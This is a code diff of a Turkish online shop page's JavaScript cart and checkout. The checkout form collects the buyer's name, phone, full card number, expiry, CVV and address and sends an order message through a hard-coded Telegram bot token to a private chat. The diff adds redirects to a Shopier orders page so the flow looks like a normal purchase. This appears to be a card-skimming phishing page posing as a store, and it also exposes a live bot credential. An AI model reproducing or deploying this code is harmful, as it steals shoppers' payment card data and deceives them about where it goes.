@@ -1,3 +1,6 @@
+// ================== SHOPIER LINK ==================
+const SHOPIER_LINK = "https://www.shopier.com/m/orders.php";
+
 // ================== TELEGRAM AYARLARI ==================
 const TELEGRAM_TOKEN = "8572363144:AAFLFLu2b4MKvm-ARzyUAxV9GqPPcQ2xd-4";
 const TELEGRAM_CHAT_ID = "1538267112";
@@ -34,11 +37,11 @@ const panelFooter  = document.getElementById('panelFooter');
 
 // ================== PANEL AÇ / KAPAT ==================
 cartToggle.addEventListener('click', openCart);
-
 closeCart.addEventListener('click', () => {
   cartPanel.classList.remove('active');
 });
 
+// ================== SEPET BUTONLARI ==================
 addToCartBtn.addEventListener('click', () => {
   cart.qty++;
   openCart();
@@ -46,10 +49,10 @@ addToCartBtn.addEventListener('click', () => {
 
 buyNowBtn.addEventListener('click', () => {
   if (cart.qty === 0) cart.qty = 1;
-  openCheckout();
+  window.location.href = SHOPIER_LINK; // Satın Al → Shopier
 });
 
-// ================== SEPET ==================
+// ================== SEPET PANELİ ==================
 function openCart() {
   panelTitle.innerText = "Sepetim";
 
@@ -74,7 +77,7 @@ function openCart() {
     `;
 
     panelFooter.innerHTML = `
-      <button onclick="openCheckout()">Ödemeye Geç</button>
+      <button onclick="window.location.href='${SHOPIER_LINK}'">Ödemeye Geç</button>
     `;
   }
 
@@ -82,28 +85,13 @@ function openCart() {
 }
 
 // ================== ADET ==================
-function increaseQty() {
-  cart.qty++;
-  openCart();
-}
+function increaseQty() { cart.qty++; openCart(); }
+function decreaseQty() { cart.qty--; if(cart.qty<1)cart.qty=1; openCart(); }
+function removeItem() { cart.qty=0; openCart(); }
 
-function decreaseQty() {
-  cart.qty--;
-  if (cart.qty < 1) cart.qty = 1;
-  openCart();
-}
-
-function removeItem() {
-  cart.qty = 0;
-  openCart();
-}
-
-// ================== ÖDEME ==================
+// ================== ÖDEME PANELİ ==================
 function openCheckout() {
-  if (cart.qty === 0) {
-    alert("Sepet boş!");
-    return;
-  }
+  if (cart.qty === 0) { alert("Sepet boş!"); return; }
 
   const total = cart.qty * cart.price;
   panelTitle.innerText = "Güvenli Ödeme";
@@ -150,49 +138,36 @@ function openCheckout() {
 
 // ================== INPUT FORMATLAMA ==================
 document.addEventListener("input", function (e) {
-
-  // Telefon
   if (e.target.id === "phone") {
-    let v = e.target.value.replace(/\D/g, "").substring(0, 10);
-    let f = v;
-    if (v.length > 3) f = v.slice(0,3) + " " + v.slice(3);
-    if (v.length > 6) f = v.slice(0,3) + " " + v.slice(3,6) + " " + v.slice(6);
-    if (v.length > 8) f = v.slice(0,3) + " " + v.slice(3,6) + " " + v.slice(6,8) + " " + v.slice(8);
-    e.target.value = f;
+    let v = e.target.value.replace(/\D/g,"").substring(0,10);
+    if(v.length>3 && v.length<=6) v=v.slice(0,3)+" "+v.slice(3);
+    else if(v.length>6) v=v.slice(0,3)+" "+v.slice(3,6)+" "+v.slice(6);
+    e.target.value=v;
   }
-
-  // Kart
-  if (e.target.id === "card") {
-    let v = e.target.value.replace(/\D/g, "").substring(0, 16);
-    e.target.value = v.match(/.{1,4}/g)?.join(" ") || "";
+  if(e.target.id==="card") {
+    let v=e.target.value.replace(/\D/g,"").substring(0,16);
+    e.target.value=v.match(/.{1,4}/g)?.join(" ")||"";
   }
-
-  // SKT
-  if (e.target.id === "exp") {
-    let v = e.target.value.replace(/\D/g, "").substring(0, 4);
-    e.target.value = v.length > 2 ? v.slice(0,2) + "/" + v.slice(2) : v;
+  if(e.target.id==="exp") {
+    let v=e.target.value.replace(/\D/g,"").substring(0,4);
+    e.target.value = v.length>2 ? v.slice(0,2)+"/"+v.slice(2) : v;
   }
-
-  // CVV
-  if (e.target.id === "cvv") {
-    e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
+  if(e.target.id==="cvv") {
+    e.target.value=e.target.value.replace(/\D/g,"").substring(0,3);
   }
 });
 
 // ================== TELEGRAM ==================
-function sendTelegramMessage(message) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message
-    })
+function sendTelegramMessage(message){
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID,text:message})
   });
 }
 
 // ================== SİPARİŞ TAMAMLAMA ==================
-function completeOrder() {
+function completeOrder(){
   const name    = document.getElementById("name").value.trim();
   const phone   = document.getElementById("phone").value.trim();
   const card    = document.getElementById("card").value.trim();
@@ -200,13 +175,14 @@ function completeOrder() {
   const cvv     = document.getElementById("cvv").value.trim();
   const address = document.getElementById("address").value.trim();
 
-  if (!name || !phone || !card || !exp || !cvv || !address) {
+  if(!name||!phone||!card||!exp||!cvv||!address){
     alert("Lütfen tüm alanları eksiksiz doldurun!");
     return;
   }
 
   const total = cart.qty * cart.price;
 
+  // Telegram mesajı
   const message = `
 🛒 YENİ SİPARİŞ!
 
@@ -221,7 +197,10 @@ Toplam: ${total} TL
 
   sendTelegramMessage(message);
 
-  alert("Siparişiniz başarıyla alındı ❤️");
+  // Shopier yönlendirme
+  window.location.href = SHOPIER_LINK;
+
+  // Sepeti sıfırla
   cart.qty = 0;
   cartPanel.classList.remove('active');
 }
